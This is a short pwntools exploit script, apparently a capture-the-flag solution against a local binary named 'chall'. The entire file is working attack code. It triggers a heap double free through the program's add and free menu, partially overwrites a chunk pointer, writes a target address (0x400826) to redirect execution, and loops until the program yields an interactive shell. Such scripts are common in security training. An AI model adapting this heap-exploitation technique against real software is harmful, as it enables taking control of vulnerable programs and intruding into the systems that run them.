from pwn import *
#libc=ELF('/lib/x86_64-linux-gun/libc-2.23.so')
#log.warning(hex(base))

context.log_level='debug'
aim=0x000000000400826
def exp():
	def cmd(c):
		p.sendlineafter(">>",str(c))
	def add(c):
		cmd(1)
		p.sendlineafter(": ",str(c))
	def free(idx):
		cmd(3)
		p.sendlineafter("id:",str(idx))
	try:
		p=process('./chall')
		add(p64(0x41)*5)
		add(p64(0x41)*5)
		add(p64(0x41)*5)
		add(p64(0x41)*5)	
		free(0)
		free(1)
		free(0)
		add('\x60')
		#
		add("B")
		add("A")
		
		add(p64(aim)*5)
		gdb.attach(p,'')
		free(1)
		

		p.interactive()
	except Exception:
		p.close()
while(1):
	exp()
